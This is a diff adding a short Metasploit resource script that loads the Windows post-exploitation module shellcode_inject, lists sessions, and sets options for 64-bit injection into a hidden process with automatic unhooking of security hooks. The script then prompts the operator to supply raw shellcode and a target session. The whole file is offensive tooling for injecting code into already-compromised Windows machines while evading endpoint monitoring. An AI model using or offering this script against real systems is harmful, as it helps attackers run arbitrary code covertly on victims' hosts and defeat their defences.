@@ -1,0 +1,17 @@
+<ruby>
+
+run_single('use post/windows/manage/shellcode_inject')
+
+run_single('sessions -l -x')
+run_single('options')
+run_single("set AUTOUNHOOK true")
+run_single("set BITS 64")
+run_single("set HIDDEN true")
+run_single('set WAIT_UNHOOK 10')
+puts ""
+puts "[!] set your SHELLCODE"
+puts "[+] this should be a RAW formatted shellcode.bin file. It does not have to be meterpreter."
+puts "[!] set your SESSION"
+
+sleep(1)
+</ruby>
